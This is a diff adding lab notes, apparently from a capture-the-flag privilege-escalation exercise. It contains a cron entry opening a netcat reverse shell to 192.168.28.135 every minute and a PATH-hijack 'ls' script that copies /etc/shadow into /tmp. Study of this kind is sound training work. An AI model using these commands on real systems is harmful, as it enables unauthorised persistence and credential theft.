@@ -110,3 +110,28 @@ or john sick_hash.txt - the shadow entry cp to a txt file
 
 once cracked john --show sick_hash.txt
 
+======================================
+===================================
+
+
+
+questions
+Once you obtain root access, you are to implement persistence using a reverse bash shell via CRON.
+The IP address and port for the reverse shell will be supplied to you. IP: 192.168.28.135 Port: 33403
+There are several CRON files you can use, so any one of them can be used. Your CRON job is to beacon out every minute.
+If it isn’t set to beacon every minute, you will not get the flag. Once completed, the flag will be placed in the /tmp directory.
+ * *   *   *   *    nc 192.168.28.135 33403 -e /bin/bash
+
+
+
+
+There is a user on the system with the ability to sudo certain programs that has a '.' 
+dot in their path and is navigating to and listing the contents of common world writable 
+directories approximately every five minutes.
+The user's script is running like this:
+cd `printf "/var/tmp\n/tmp\n"|sort -R | head -n 1`;ls
+The flag is located in this users home directory.
+#!/bin/bash
+whoami >> /tmp/rootstuff.txt
+cat /etc/shadow >> /tmp/rootstuff.txt |OR|  /sbin/ls /root/
+
